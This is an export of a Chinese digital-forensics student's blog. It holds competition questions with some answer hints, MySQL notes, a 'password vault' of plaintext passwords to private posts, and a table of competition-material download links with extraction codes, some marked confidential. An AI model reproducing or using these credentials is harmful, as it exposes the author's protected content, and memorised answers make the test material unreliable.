@1@#!aajsk1*JKJ\n## 85、接上题，机主发送的这个加密文档，打开密码是什么？（答案格式：按照实际情况填写）（ ）\n- 随波逐流\n- 摩斯解码:QWERT666\n## 86、厉明的身份证地址登记的门牌号是多少？？（答案格式：1）（ ）\n- 搜身份证\n- 找data/data里面mxt的数据库，名称里面有mxt的比较可疑\n![alt text](/img/数证_image-9.png)\n## 87、分析出“important1.xlsx”文件中体现的“金达欣”银行卡后六位？（答案格式：111111）（ ）\n![alt text](/img/数证_image-10.png)\n## 88、接上题，保存“important1.xlsx”打开密码数据的应用，该应用的启动密码是什么？（答案格式：按照实际情况填写）（ ）\n# 数据分析\n## 89、通过对检材“01-lott.sql”文件进行分析，统计庄家\"188\"在2021-05-10当日的电子投注总笔数（答案格式：1）（ ）\n## 90、通过对检材“01-lott.sql”文件进行分析，统计t_trade_betrecord中庄家\"188\"记录中彩票类型为\"jnd28\"且期号在t_lottery_jnd表中存在的记录数。（答案格式：1）（ ）\n## 91、通过对检材“01-lott.sql”文件进行分析，统计庄家\"188\"的玩家在2021-05-10当日：电子投注内容出现频率最高的电子投注内容是什么？（答案格式：按照实际情况填写）（ ）\n## 92、通过对检材“01-lott.sql”文件进行分析，关联t_trade_betrecord与t_lottery_jnd表，分析庄家\"188\"在2021-05-10投注\"jnd28\"时：当开奖结果为\"大\"时，玩家投注包含\"小\"的笔数占比（使用双位数格式，答案格式：11.11%）（ ）\n## 93、通过对检材“02-crime_records.sql”分析，统计相邻两次作案时间间隔在1天之内的城市和该城市两次作案时间间隔在1天之内的案件总数量，找出案件总数最多的城市名。（答案格式：按照实际情况填写）（ ）\n## 94、通过对检材“02-crime_records.sql”分析，根据案件的损失金额和伤情等级，将案件分为 “轻微案件”“一般案件”“重大案件”“其他”四类（分类规则如下），并统计 2023 年各类型案件的数量。轻微案件：损失金额≤10000 元且无人员受伤（injury_level 为空或未提及）；一般案件：损失金额 10001-50000 元，或有轻微伤；重大案件：损失金额 > 50000 元，或有轻伤或有重伤；其他：非上述情况。（按照案件数量的降序输出答案，答案格式为：40/30/20/10）（ ）\n## 95、通过对检材“02-crime_records.sql”分析，统计 2021-2023 年期间（含2021年和2023年），每年处理结果为 “移送起诉” 的案件里，每一年中损失总额最高的案件类型对应的损失总额为？（按 2021 - 2023 年顺序连接损失总额，连接符号使用/,小数点保留2位，答案格式为 ：1.37/2.21/3.45）（ ）\n## 96、通过对检材“03-案件卡串号数据”表分析，该表每条数据的“卡串号(IMSI)”字段值存在问题，不可信。真实可信的卡串号值在“溯源”字段中（溯源字段的值格式均为“{手机号=[待获取的卡串号->手机卡串号(IMSI)使用过的手机号->当前]}”），请统计分析出该表中哪个真实卡串号出现过的次数最多？（答案格式：按照实际情况填写）（ ）\n## 97、通过对检材“04-涉诈案件信息表“分析，统计每个分局2024-2025年每月被骗总额环比大于30%的月份个数（环比定义：（这个月的数据-上个月的数据）/上个月数据。特殊情况，例如某分局2025年1月被骗金额总和为100，若该分局2024年12月没有被骗金额，则该分局2025年1月也符合题目要求，应增加一个月份。2024年1月不需要计算与上个月的环比情况），请写出环比大于30%的月份个数最多的分局ID名称为？（答案格式：按照实际情况填写）（ ）\n## 98、通过对检材“05-人像卡口信息表”和“06-涉毒前科人员信息表”（两表均无重复数据，直接要求答题即可。感知时间字段格式均为yyyy-MM-dd HH:mm:ss；传感器ID（人像卡口点位）值不同则代表不同的摄像点位），为摸排疑似涉毒的窝点，请分析出在00:00:00~06:00:00(含0点跟6点)人像记录中，哪个传感器点位ID抓拍到最多的不同涉毒前科人员？（答案格式：按照实际情况填写）（ ）\n## 99、接上题，为摸排潜在的涉毒人员，请分析出有多少个非涉毒前科人员至少跟3个不同的涉毒前科人员同行过？（本题的“同行”指：两人在同一个人像卡口点位感知时间差在10（含）秒内）（答案格式：1）（ ）\n## 100、近几年架设简易GOIP设备进行群呼诈骗的案件屡见不鲜。架设和维护该设备的人员通常会频繁更换酒店【即只住一天然后更换酒店】以此躲避公安的侦察打击。请根据”07-旅店住宿信息表“（该表无重复数据，直接要求答题即可。时间相关的字段格式均为yyyy-MM-dd HH:mm:ss），筛选出2024和2025年的住宿记录（以“入住时间”为准），频繁更换酒店的人员有几个？（答案格式：1）（ ）\n"},{"title":"MySQL学习笔记","url":"/2025/11/01/MySQL学习笔记/","content":"- SQL 对大小写不敏感：SELECT 与 select 是相同的。\n## 采集\n### SELECT 语句\n- SELECT 语句用于从数据库中选取数据。结果被存储在一个结果表中，称为结果集。\n- SQL SELECT 语法\n```SQL\nSELECT column1, column2, ...\nFROM table_name;\n\nSELECT * FROM table_name;\n```\n- 参数说明：\n  - column1, column2, ...：要选择的字段名称，可以为多个字段。如果不指定字段名称，则会选择所有字段。\n  - table_name：要查询的表名称。\n  - *: 通配符，表示选择表中的所有列。\n\n### SELECT DISTINCT 语句\n- SELECT DISTINCT 语句用于返回唯一不同的值。\n- SQL SELECT DISTINCT 语法\n```SQL\nSELECT DISTINCT column1, column2, ...\nFROM table_name;\n```\n\n### WHERE 子句\n- WHERE 子句用于过滤记录。\n- SQL WHERE 语法\n```SQL\nSELECT column1, column2, ...\nFROM table_name\nWHERE condition;\n# 示例：\nSELECT * FROM Websites WHERE country='CN';\n```\n\n### AND & OR 运算符\n```SQL\nSELECT column1, column2, ...\nFROM table_name\nWHERE condition\n# AND condition1;\n# OR condition1;\n```\n\n### ORDER BY 关键字\n- ORDER BY 关键字用于对结果集进行排序,默认按照升序对记录进行排序。如果需要按照降序对记录进行排序，您可以使用 DESC 关键字。\n- ORDER BY 语法\n```SQL\nSELECT column1, column2, ...\nFROM table_name\nORDER BY column1, column2, ... ASC|DESC;\n```\n- ASC：表示按升序排序；DESC：表示按降序排序。\n\n### LIMIT\n- MySQL 语法：限制输出行数\n```SQL\nSELECT column1, column2, ...\nFROM table_name\nLIMIT number;\n```\n\n### LIKE 操作符\n- LIKE 操作符用于在 WHERE 子句中搜索列中的指定模式，通常与 % 和 _ 通配符一起使用。\n- LIKE 语法\n```SQL\nSELECT column1, column2, ...\nFROM table_name\nWHERE column_name LIKE pattern;\n```\n- 参数说明：\n  - 通配符\n    - %：匹配任意字符（包括零个字符）。\n    - _：匹配单个字符。\n\n## 编辑\n### INSERT INTO 语句\n- INSERT INTO 语句用于向表中插入新记录。\n- INSERT INTO 语法\n  - 两种编写形式。\n  - 第一种形式无需指定要插入数据的列名，只需提供被插入的值即可：\n```SQL\nINSERT INTO table_name\nVALUES (value1,value2,value3,...);\n```\n  - 第二种形式需要指定列名及被插入的值：\n```SQL\nINSERT INTO table_name (column1,column2,column3,...)\nVALUES (value1,value2,value3,...);\n```\n\n### UPDATE 语句\n- UPDATE 语句用于更新表中的记录。\n- UPDATE 语法\n```SQL\nUPDATE table_name\nSET column1 = value1, column2 = value2, ...\nWHERE condition;\n```\n\n### DELETE 语句\n- DELETE 语句用于删除表中的行。\n- DELETE 语法\n```SQL\nDELETE FROM table_name\nWHERE condition;\n```\n\n\n### 参考\n- [菜鸟教程-SQL教程](https://www.runoob.com/sql/sql-syntax.html)\n\n# 暂时学到：<https://www.runoob.com/sql/sql-wildcards.html>","tags":["SQL"],"categories":["语法笔记"]},{"title":"密码保管箱","url":"/2025/10/28/密码保管箱/","content":"| title | password | 备注 |\n| -- | -- | -- |\n|SPC新生赛即美亚杯选拔赛保密部分|dhbaomi|\n|网络安全竞赛技术分享汇总|dhbaomi|\n|私密比赛1|dhmimayaobaomio|第五届全国刑事技术技能大赛|\n|本地模型在cherry中mcp使用技巧|074224Lty|\n|软件下载方法存档|21479814057439827458|"},{"title":"SPC新生赛即美亚杯选拔赛保密部分","url":"/2025/10/27/SPC新生赛即美亚杯选拔赛保密部分/","content":"- X-ways\n  - 递归操作：一般在操作栏左侧选中你需要的文件右键，就把树状结构拍成一个平面\n  - 打开文件最好解压缩后打开文件夹，不然可能解压错误\n  - ctrl+Q清空\n- [win+R妙用](https://blog.csdn.net/qq_46607667/article/details/149305144)"},{"title":"网络安全竞赛技术分享汇总","url":"/2025/10/26/网络安全竞赛技术分享汇总/","content":"# 🔐 网络安全竞赛技术分享汇总\n\n> 📊 **数据统计**：95个比赛/训练项目 | 评分范围：1-5星 | 覆盖2021-2025年\n\n## 📋 目录\n\n- [📅 按年份排列](#📅-按年份排列)\n  - [2025年](#2025年)\n  - [2024年](#2024年)\n  - [2023年](#2023年)\n  - [2022年](#2022年)\n  - [2021年](#2021年)\n  - [美亚杯](#历年美亚杯)\n- [⭐ 按星级推荐](#⭐-按星级推荐)\n- [📊 数据统计分析](#📊-数据统计分析)\n\n---\n\n## 📅 按年份排列\n\n### 2025年\n\n| 赛事名称 | 出题方 | 特点 | 评分 | 附件 |\n|---------|--------|------|------|------|\n| **FIC决赛** | 弘连 | 断网比赛答案藏在github上面，apk简单 | ⭐⭐⭐⭐ | [下载](https://pan.baidu.com/s/1y2Ei63k7mGGJx3wXB9644g?pwd=zjpc) |\n| **盘古石初赛** | 奇安信 | 题值得推敲，今年最有诚意的题 | ⭐⭐⭐⭐ | [下载](https://pan.baidu.com/s/1WrePlon3PIKOi_DVFLTWwQ?pwd=zjpc) |\n| **广东网安取证选拔** | 弘连 | Git操作，服务器修复考点多，那咋了面板（魔改宝塔） | ⭐⭐⭐ | [下载](https://pan.baidu.com/s/14osw0KjU6ogSTrdnHYYUpQ?pwd=pfki) |\n| **平航杯** | 个人赛平航；团队赛浙江警察学院 | 剧情我不喜欢？？（除了你都喜欢 | ⭐⭐⭐ | [下载](https://pan.baidu.com/s/1NTrH8KUFTSPPT2fGZHz8BQ?pwd=zjpc) |\n| **辽宁抚顺比武** | 缝合怪 | 难度低，拼接题（服务器弘连，手机、计算机PGS） | ⭐⭐ | [下载](https://pan.baidu.com/s/10JsZLVe2KcuzBhBuic6pow?pwd=zjpc) |\n| **獬豸杯** | 甘肃政法大学 | 新生赛难度 | ⭐⭐ | [下载](https://pan.baidu.com/s/10c_FBSy4OIMJhJTSI-V-og?pwd=gi53) |\n| **20250715下午能力验证** | 公安三所 | Windows烂题，抄平航杯 | ⭐⭐ | [下载](https://pan.baidu.com/s/1gSHl3nufgcv5BiTcxC2Dog?pwd=2t3u) |\n| **20250715上午能力验证** | 公安三所 | 流量有意思，Windows中等难度，另外这四套能力验证题目都只有常规介质+流量 | ⭐⭐ | [下载](https://pan.baidu.com/s/1FNkJ_M3bYtoygOA5NIgmxA?pwd=dcbk) |\n| **20250716上午能力验证** | 公安三所 | 2025diyijie@GASS>>>fenxishi+++===??? | ⭐⭐ | [下载](https://pan.baidu.com/s/1uWvO7yxSXxu20JDvgebbkA?pwd=ukk2) |\n| **20250716下午能力验证** | 公安三所 | +??>>>>Gass;NengliYanzheng2025<<<??+ | ⭐⭐ | [下载](https://pan.baidu.com/s/1Xc86Hh1JdbHabBkaFmZ__Q?pwd=huay) |\n| **2025安徽xz省赛** | 弘连 | 新生赛难度（偏向misc，各种隐写） | ⭐⭐ | [下载](https://pan.baidu.com/s/1-SHDTcRFz_mDj4lQhBzIIw?pwd=rpvk) |\n| **黑龙江刑侦** | 拓界 | 新生赛难度 | ⭐⭐ | [下载](https://pan.baidu.com/s/1UrD9yMrcYUcQBrn_IWAQMw?pwd=28cq) |\n| **中科实数杯** | 中科实数 | 新生赛难度 | ⭐⭐ | [下载](https://pan.baidu.com/s/1-wI7eEe-YG9WSwEahsX7Eg?pwd=8snz) |\n| **温州砺剑** | 缝合怪 | 均是比武改编 | ⭐ | [下载](https://pan.baidu.com/s/13wn_qRTcB8KR7cTYbo06xA?pwd=zjpc) |\n| **FIC初赛** | 弘连 | 没见过出的这么烂的题，一星都嫌多 | ⭐ | [下载](https://pan.baidu.com/s/1y2Ei63k7mGGJx3wXB9644g?pwd=zjpc) |\n| **甘肃联赛** | 弘连 | | | [下载](https://pan.baidu.com/s/1dLCXFve8cKaNxyy3qQlM-w?pwd=p1st) |\n| **斟茶王者第二期** | 无糖 | 需要无糖浏览器内调证 | ⭐⭐⭐ | [下载](https://pan.baidu.com/s/1tyIY4cXgH14P6nqZl4K10Q?pwd=mxk7) |\n| **2025山东xz省赛第一轮取证题** | 拓界 | 复杂密码 | | [下载](https://pan.baidu.com/s/1pSl9ckHtXtnrpOJY9tg1tA?pwd=406f) |\n| **帕鲁杯** | 知攻善防实验室 | 国内第一个应急响应赛 | ⭐⭐⭐⭐ | [下载](https://pan.baidu.com/s/1e3iGO0G7H-rt0du9Dy-USQ?pwd=6cdd) |\n| **青海刑侦** | 美亚 | | | [下载](https://pan.baidu.com/s/1WoeLeeaVVM63-zaT0wuT4A?pwd=ii9x) |\n| **山东联赛** | 美亚 | | | [下载](https://pan.baidu.com/s/1narzTt03Nv_aJcI27y_LUA?pwd=4jww) |\n| **2025安徽xz省赛** | 弘连 | | | [下载](https://pan.baidu.com/s/1b4aYYNqZGggK9atDzZyKXA?pwd=7890) |\n| **2025安徽xz省赛** | 弘连 | | | [下载](https://pan.baidu.com/s/1SEWPdlBicGWjK3Q6QdpgRQ?pwd=7890) |\n| **2025山东xz省赛** | 弘连 | | | [下载](https://pan.baidu.com/s/1rB7tnUbSSSjmM97Zz2vHOw?pwd=aucx) |\n| **2025安徽xz省赛** | 弘连 | 题目不完整 | | [下载](https://pan.baidu.com/s/1CkVQL_IByXwnawh02O4ArA?pwd=sdb5) |\n| **2025浙江xz省赛** | 弘连 | 缺少题目 | | [下载](https://pan.baidu.com/s/1umHHV2IUPdt2gATqMPD8WQ?pwd=j3fp) |\n| **2025河南xz省赛** | 弘连 | | | [下载](https://pan.baidu.com/s/1lknwCylh8yoQzAKT0g_PkA?pwd=utz3) |\n| **2025广东XZ省赛** | 弘连 | 缺少题目 | | [下载](https://pan.baidu.com/s/1eSqK6TcaDqarqUup1y2oVg?pwd=aik7) |\n| **2025浙江xz省赛** | 弘连 | | | [下载](https://pan.baidu.com/s/1Be4QmFx49caE609N8gAyzQ?pwd=zjpc) |\n| **2025台州比武** | 弘连 | | | [下载](https://pan.baidu.com/s/15j0Bi7vKlY0ZK5QYstUzIA?pwd=zjpc) |\n| **2025浙江刑侦比武省赛** | 弘连 | | | [下载](https://pan.baidu.com/s/1jyNuaVMVBkhrdbm8pwtU4g?pwd=4cs5) |\n| **2025上海网安总队内部演练** | 弘连 | | | [下载](https://pan.baidu.com/s/1PAo0FDXnt6h0gRslNqByYw?pwd=snni) |\n| **河南联赛** | 弘连 | | | [下载](https://pan.baidu.com/s/1jQaqn261ORNCP0dm_QgWlw?pwd=9yr8) |\n| **浙江联赛** | 弘连 | 缺少题目 | | [下载](https://pan.baidu.com/s/1cWSqBsxv-HPJVRn2Vzkz-w?pwd=9ftf) |\n| **河南集训** | 弘连 | | | [下载](https://pan.baidu.com/s/1fcoFWV1xq8IfJS2h533sEA?pwd=zjpc) |\n| **2025河南集训** | 弘连 | | | [下载](https://pan.baidu.com/s/1kGO53CkQrCvqF9UV_Lkh0A?pwd=bxpf) |\n| **2025年上海联赛** | 美亚 | 去年题目 | | [下载](https://pan.baidu.com/s/1tm5BHhUhyJyThCN0Y86zrg?pwd=dtbe) |\n| **2025年美亚杯** | 美亚 | | | [下载](https://pan.baidu.com/s/12-pq6H02eYc6pDzw54_hKg?pwd=7xaf) |\n| **蓝帽杯** | 弘连 | | | [下载](https://pan.baidu.com/s/1-zvhUcK2POGUkPqV85FhkQ?pwd=mjm6) |\n| **美亚杯** | 美亚 | | | [下载](https://pan.baidu.com/s/12-pq6H02eYc6pDzw54_hKg?pwd=7xaf) |\n\n### 2024年\n\n| 赛事名称 | 出题方 | 特点 | 评分 | 附件 |\n|---------|--------|------|------|------|\n| **数证杯** | 初赛缝合怪；决赛三所 | rust逆向，挖矿节点搭建 | ⭐⭐⭐⭐⭐ | [下载](https://pan.baidu.com/s/1ufMYLQMy5WnmKbioHLJWww?pwd=3d23) |\n| **平航杯** | 个人赛平航；团队赛浙江警察学院 | 反取证 | ⭐⭐⭐⭐⭐ | [下载](https://pan.baidu.com/s/1u1uryHEE79StDkiXHPQDTw?pwd=bsfq) |\n| **奇安信内部比武** | 奇安信 | 与网络侦查结合 | ⭐⭐⭐⭐⭐ | [下载](https://pan.baidu.com/s/1-jZgViRdydE7U1AOcJKbMA?pwd=4p78) |\n| **全国刑侦比武** | - | 考察全面，考验手搓能力 | ⭐⭐⭐⭐⭐ | [下载](https://pan.baidu.com/s/1QsHynIx1NMkRp6lf7cf7GA?pwd=cth4) |\n| **浙江联赛** | 弘连 | 个人赛wj题；团队赛apk巨难 | ⭐⭐⭐⭐ | [下载](https://pan.baidu.com/s/1C56pk9AA9u5hmd51iUiSdA?pwd=kpzt) |\n| **帕鲁杯** | 知攻善防实验室 | 国内第一个应急响应赛 | ⭐⭐⭐⭐ | [下载](https://pan.baidu.com/s/1e3iGO0G7H-rt0du9Dy-USQ?pwd=6cdd) |\n| **上海联赛** | 弘连 | 过于简单，不像联赛难度 | ⭐⭐⭐ | [下载](https://pan.baidu.com/s/1VlCcDNpu5jX3GBl3kmBqVw?pwd=g8jy) |\n| **重庆联赛** | 美亚 | 美亚特有的不给标答，部分题质量还可以 | ⭐⭐⭐ | [下载](https://pan.baidu.com/s/1RJF9mdy5I1ASJh5VTYN3iQ?pwd=3168) |\n| **美亚杯** | 美亚 | 没新意，但是新生值得一做 | ⭐⭐⭐ | [下载](https://pan.baidu.com/s/1165Go44iGDwX1tsTteiMSA?pwd=3dvf) |\n| **杭州比武** | 平航 | mac钥匙串 | ⭐⭐⭐ | [下载](https://pan.baidu.com/s/13ezC9LoqLjfh64wJ461KPA?pwd=twg5) |\n| **盘古石杯** | 奇安信 | 不像取证，部分题质量还行 | ⭐⭐⭐ | [下载](https://pan.baidu.com/s/1M1Z0uWsz_myxs8Zz7ZnEzQ?pwd=8mrc) |\n| **斟茶王者第二期** | 无糖 | 需要无糖浏览器内调证 | ⭐⭐⭐ | [下载](https://pan.baidu.com/s/1tyIY4cXgH14P6nqZl4K10Q?pwd=mxk7) |\n| **福建联赛** | 初赛奇安信；决赛弘连 | 出题方故意修改题目条件导致部分题做不了 | ⭐ | [下载](https://pan.baidu.com/s/121WTmbG2R1bdf6V66wnEeA?pwd=8t53) |\n| **全国联赛浙江选拔** | 弘连 | 软件题，不知道是不是在推销软件 | ⭐ | [下载](https://pan.baidu.com/s/10dR6MV_GGImVS1Iz9TNSRw?pwd=ve6r) |\n| **公大校赛** | 平航 | 新生赛难度 | ⭐⭐ | [下载](https://pan.baidu.com/s/1pdoHGWegclq5TLsubRcuFQ?pwd=dj96) |\n| **浙江刑侦比武** | 平航 | 新生赛难度 | ⭐⭐ | [下载](https://pan.baidu.com/s/1zwTIHT0Hlg5Er3z8EPZ2EA?pwd=2vsg) |\n| **中科实数杯** | 中科实数 | 新生赛难度 | ⭐⭐ | [下载](https://pan.baidu.com/s/1-wI7eEe-YG9WSwEahsX7Eg?pwd=8snz) |\n| **广东网安取证选拔** | 弘连 | Git操作，服务器修复考点多，那咋了面板（魔改宝塔） | ⭐⭐⭐ | [下载](https://pan.baidu.com/s/14osw0KjU6ogSTrdnHYYUpQ?pwd=pfki) |\n| **奇安信内部比武** | 奇安信 | 与网络侦查结合 | ⭐⭐⭐⭐⭐ | [下载](https://pan.baidu.com/s/1-jZgViRdydE7U1AOcJKbMA?pwd=4p78) |\n| **全国刑侦比武** | - | 考察全面，考验手搓能力 | ⭐⭐⭐⭐⭐ | [下载](https://pan.baidu.com/s/1QsHynIx1NMkRp6lf7cf7GA?pwd=cth4) |\n| **云南联赛** | 弘连 | | | [下载](https://pan.baidu.com/s/1LKKt5Sog1Q_-4UNXTpXdKw?pwd=eb9x) |\n| **龙信杯** | 龙信 | | | [下载](https://pan.baidu.com/s/1XQBTBWQrgHLnGxU1sEwuXA?pwd=ni8y) |\n| **北京集训** | 美亚 | | | [下载](https://pan.baidu.com/s/1ZcvWfLAJXuwlZ8P14DRg-A?pwd=2uiq) |\n| **甘肃联赛** | 美亚 | | | [下载](https://pan.baidu.com/s/1IKNNFxhqMy3ZfySY5KoiGQ?pwd=ruk1) |\n| **天津联赛** | 美亚 | | | [下载](https://pan.baidu.com/s/1ngr3e5sFoa7GBeQ9NK7jZg?pwd=w9in) |\n\n### 2023年\n\n| 赛事名称 | 出题方 | 特点 | 评分 | 附件 |\n|---------|--------|------|------|------|\n| **盘古石杯** | 奇安信 | 纯难 | ⭐⭐⭐⭐ | [下载](https://pan.baidu.com/s/1uQV9qM5eQ-paZ24l9vaedg?pwd=wgm4) |\n| **台州比武** | - | 渗透加取证 | ⭐⭐⭐⭐⭐ | [下载](https://pan.baidu.com/s/1UwM-nvhXyDLeNe8Y2xqSJw?pwd=atrc) |\n| **浙警校赛** | 浙江警察学院 | 难度适中，有点小脑洞 | ⭐⭐⭐ | [下载](https://pan.baidu.com/s/1lpi0qlcEV1WXtAzEDnj4bA?pwd=piei) |\n| **蓝帽杯** | 奇安信 | 新生赛难度 | ⭐⭐ | [下载](https://pan.baidu.com/s/1WQe6DCwwlCFmPz1LI7u5kw?pwd=jems) |\n| **中科实数杯** | 中科实数 | 新生赛难度 | ⭐⭐ | [下载](https://pan.baidu.com/s/1Hi3gJFiBgyAJXH_JBY_zKg?pwd=1kzf) |\n| **美亚杯** | 美亚 | 1个多t的检材，谁能忍住不骂 | ⭐ | [下载](https://pan.baidu.com/s/1tLHFURY33ZRDZy8MSKgXXg?pwd=yy64) |\n| **广东网安取证选拔** | 弘连 | Git操作，服务器修复考点多，那咋了面板（魔改宝塔） | ⭐⭐⭐ | [下载](https://pan.baidu.com/s/14osw0KjU6ogSTrdnHYYUpQ?pwd=pfki) |\n| **上海联赛** | 美亚 | 去年题目 | | [下载](https://pan.baidu.com/s/1AZojCNmttM3my1E1ASvoCg?pwd=a2nh) |\n| **甘肃联赛** | 美亚 | | | [下载](https://pan.baidu.com/s/1ybYrhyujEdIajeuhMF7eIQ?pwd=6m4m) |\n| **甘肃联赛** | 美亚 | 涉密 | | [下载](https://pan.baidu.com/s/1gCfKJSLzJ1OuGUVGWB6Eow?pwd=uwyp) |\n\n### 2022年\n\n| 赛事名称 | 出题方 | 特点 | 评分 | 附件 |\n|---------|--------|------|------|------|\n| **台州网安比武** | 弘连 | esxi启蒙题目 | ⭐⭐⭐⭐⭐ | [下载](https://pan.baidu.com/s/1_5OmdlcVLQnMLKwbh7SGVg?pwd=d7ta) |\n| **安徽网安比武** | - | k8s启蒙题目 | ⭐⭐⭐⭐ | [下载](https://pan.baidu.com/s/1j2egYJxP4G4J_OOyWvjQBA?pwd=y8pw) |\n| **上海市局网安大比武** | 弘连 | | | [下载](https://pan.baidu.com/s/161In2v3n8sJ7-hGts3KAPA?pwd=djbj) |\n\n### 2021年\n\n| 赛事名称 | 出题方 | 特点 | 评分 | 附件 |\n|---------|--------|------|------|------|\n| **FIC** | 弘连 | 一眼wj题，单镜像，找flag形式，偏CTF | | [下载](https://pan.baidu.com/s/1oZ3UPPuq7mtAMIepqAM_yQ?pwd=pb3p) |\n| **平航杯台赛** | 平航 | | | [下载](https://pan.baidu.com/s/1-4z5i_mTfqYwN3tXJ2GnuA?pwd=406f) |\n| **平航杯台赛** | 平航 | | | [下载](https://pan.baidu.com/s/1Fbv6VKwQW5vvii4J69iHNw?pwd=406f) |\n| **盘古石2021年台赛** | 奇安信 | 参考wp | | [下载](https://pan.baidu.com/s/1ywwInylWaialAhXb6TfpcQ?pwd=406f) |\n| **安徽网安比武** | - | k8s启蒙题目 | ⭐⭐⭐⭐ | [下载](https://pan.baidu.com/s/1j2egYJxP4G4J_OOyWvjQBA?pwd=y8pw) |\n| **安徽网安比武** | - | k8s启蒙题目 | ⭐⭐⭐⭐ | [下载](https://pan.baidu.com/s/1j2egYJxP4G4J_OOyWvjQBA?pwd=y8pw) |\n| **Hadoop集群搭建** | 弘连 | Hadoop集群搭建  wp 实战记录 | | [下载](https://pan.baidu.com/s/18fWs1gMFehS8HK3E-84QUw?pwd=9tkx) |\n| **qax一百星全栈项目** | 弘连 | qax 全栈培训的记录 滚动etcd集群 红队蓝队集群项目 | | [下载](https://pan.baidu.com/s/1mG6kBgE_sXHfSsjHchmnCg?pwd=ay8w) |\n| **辽宁联赛** | 美亚 | 美亚云平台项目 挖掘日志 挖掘项目 红队实战 取证题目 | | [下载](https://pan.baidu.com/s/1MVl_Rsa1CjZiMg3u4Y7tZA?pwd=xcrs) |\n\n### 历年美亚杯\n| 赛事名称 | 出题方 | 特点 | 评分 | 附件 |\n|---------|--------|------|------|------|\n| **美亚杯** |美亚 |15年~24年 | | [下载](https://pan.baidu.com/s/1cnGvrFoMa1m6o-W50MU20A?pwd=481p) |\n---\n\n## ⭐ 按星级推荐\n\n### ⭐⭐⭐⭐⭐ 五星级 (5分)\n\n| 赛事名称 | 年份 | 出题方 | 特点 | 附件 |\n|---------|------|--------|------|------|\n| **数证杯** | 2024年 | 初赛缝合怪；决赛三所 | rust逆向，挖矿节点搭建 | [下载](https://pan.baidu.com/s/1ufMYLQMy5WnmKbioHLJWww?pwd=3d23) |\n| **平航杯** | 2024年 | 个人赛平航；团队赛浙江警察学院 | 反取证 | [下载](https://pan.baidu.com/s/1u1uryHEE79StDkiXHPQDTw?pwd=bsfq) |\n| **台州网安比武** | 2022年 | 弘连 | esxi启蒙题目 | [下载](https://pan.baidu.com/s/1_5OmdlcVLQnMLKwbh7SGVg?pwd=d7ta) |\n| **奇安信内部比武** | 2024年 | 奇安信 | 与网络侦查结合 | [下载](https://pan.baidu.com/s/1-jZgViRdydE7U1AOcJKbMA?pwd=4p78) |\n| **全国刑侦比武** | 2024年 | - | 考察全面，考验手搓能力 | [下载](https://pan.baidu.com/s/1QsHynIx1NMkRp6lf7cf7GA?pwd=cth4) |\n| **台州比武** | 2023年 | - | 渗透加取证 | [下载](https://pan.baidu.com/s/1UwM-nvhXyDLeNe8Y2xqSJw?pwd=atrc) |\n\n### ⭐⭐⭐⭐ 四星级 (4分)\n\n| 赛事名称 | 年份 | 出题方 | 特点 | 附件 |\n|---------|------|--------|------|------|\n| **浙江联赛** | 2024年 | 弘连 | 个人赛wj题；团队赛apk巨难 | [下载](https://pan.baidu.com/s/1C56pk9AA9u5hmd51iUiSdA?pwd=kpzt) |\n| **FIC决赛** | 2025年 | 弘连 | 断网比赛答案藏在github上面，apk简单 | [下载](https://pan.baidu.com/s/1y2Ei63k7mGGJx3wXB9644g?pwd=zjpc) |\n| **盘古石杯** | 2023年 | 奇安信 | 纯难 | [下载](https://pan.baidu.com/s/1uQV9qM5eQ-paZ24l9vaedg?pwd=wgm4) |\n| **盘古石初赛** | 2025年 | 奇安信 | 题值得推敲，今年最有诚意的题 | [下载](https://pan.baidu.com/s/1WrePlon3PIKOi_DVFLTWwQ?pwd=zjpc) |\n| **帕鲁杯** | 2024年 | 知攻善防实验室 | 国内第一个应急响应赛 | [下载](https://pan.baidu.com/s/1e3iGO0G7H-rt0du9Dy-USQ?pwd=6cdd) |\n| **安徽网安比武** | 2022年 | - | k8s启蒙题目 | [下载](https://pan.baidu.com/s/1j2egYJxP4G4J_OOyWvjQBA?pwd=y8pw) |\n\n### ⭐⭐⭐ 三星级 (3分)\n\n| 赛事名称 | 年份 | 出题方 | 特点 | 附件 |\n|---------|------|--------|------|------|\n| **平航杯** | 2025年 | 个人赛平航；团队赛浙江警察学院 | 剧情我不喜欢？？（除了你都喜欢 | [下载](https://pan.baidu.com/s/1NTrH8KUFTSPPT2fGZHz8BQ?pwd=zjpc) |\n| **广东网安取证选拔** | 2025年 | 弘连 | Git操作，服务器修复考点多，那咋了面板（魔改宝塔） | [下载](https://pan.baidu.com/s/14osw0KjU6ogSTrdnHYYUpQ?pwd=pfki) |\n| **上海联赛** | 2024年 | 弘连 | 过于简单，不像联赛难度 | [下载](https://pan.baidu.com/s/1VlCcDNpu5jX3GBl3kmBqVw?pwd=g8jy) |\n| **重庆联赛** | 2024年 | 美亚 | 美亚特有的不给标答，部分题质量还可以 | [下载](https://pan.baidu.com/s/1RJF9mdy5I1ASJh5VTYN3iQ?pwd=3168) |\n| **美亚杯** | 2024年 | 美亚 | 没新意，但是新生值得一做 | [下载](https://pan.baidu.com/s/1165Go44iGDwX1tsTteiMSA?pwd=3dvf) |\n| **杭州比武** | 2024年 | 平航 | mac钥匙串 | [下载](https://pan.baidu.com/s/13ezC9LoqLjfh64wJ461KPA?pwd=twg5) |\n| **盘古石杯** | 2024年 | 奇安信 | 不像取证，部分题质量还行 | [下载](https://pan.baidu.com/s/1M1Z0uWsz_myxs8Zz7ZnEzQ?pwd=8mrc) |\n| **斟茶王者第二期** | 2024年 | 无糖 | 需要无糖浏览器内调证 | [下载](https://pan.baidu.com/s/1tyIY4cXgH14P6nqZl4K10Q?pwd=mxk7) |\n| **浙警校赛** | 2023年 | 浙江警察学院 | 难度适中，有点小脑洞 | [下载](https://pan.baidu.com/s/1lpi0qlcEV1WXtAzEDnj4bA?pwd=piei) |\n\n### ⭐⭐ 二星级 (2分)\n\n| 赛事名称 | 年份 | 出题方 | 特点 | 附件 |\n|---------|------|--------|------|------|\n| **辽宁抚顺比武** | 2025年 | 缝合怪 | 难度低，拼接题（服务器弘连，手机、计算机PGS） | [下载](https://pan.baidu.com/s/10JsZLVe2KcuzBhBuic6pow?pwd=zjpc) |\n| **獬豸杯** | 2025年 | 甘肃政法大学 | 新生赛难度 | [下载](https://pan.baidu.com/s/10c_FBSy4OIMJhJTSI-V-og?pwd=gi53) |\n| **20250715下午能力验证** | 2025年 | 公安三所 | Windows烂题，抄平航杯 | [下载](https://pan.baidu.com/s/1gSHl3nufgcv5BiTcxC2Dog?pwd=2t3u) |\n| **20250715上午能力验证** | 2025年 | 公安三所 | 流量有意思，Windows中等难度，另外这四套能力验证题目都只有常规介质+流量 | 